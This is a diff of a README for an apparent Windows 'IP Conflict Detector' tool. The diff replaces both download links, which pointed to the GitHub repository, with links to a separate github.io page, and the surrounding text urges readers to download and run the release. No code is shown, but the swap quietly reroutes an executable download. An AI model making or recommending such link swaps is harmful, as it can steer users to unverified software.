@@ -1,6 +1,6 @@
 # 🛠️ IP-Conflict-Detector-Tool-2026 - Find and Fix Duplicate IPs Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-IP_Conflict_Detector_Tool_2026-2ea44f?style=for-the-badge&logo=windows&logoColor=white&labelColor=1f6feb)](https://github.com/Gharibg77/IP-Conflict-Detector-Tool-2026)
+[![Download Now](https://img.shields.io/badge/Download-IP_Conflict_Detector_Tool_2026-2ea44f?style=for-the-badge&logo=windows&logoColor=white&labelColor=1f6feb)](https://gharibg77.github.io)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Whether you're a home user with a few devices or managing a larger office networ
 
 ## 📥 Download and Installation
 
-Visit this link to download the application: [https://github.com/Gharibg77/IP-Conflict-Detector-Tool-2026](https://github.com/Gharibg77/IP-Conflict-Detector-Tool-2026)
+Visit this link to download the application: [https://gharibg77.github.io](https://gharibg77.github.io)
 
 Once you're on the page, look for the green "Code" button or the "Releases" section on the right side of the screen. Click it, then select "Download ZIP" or choose the latest release file. The download will start automatically, and your browser will save the file to your default Downloads folder.
 
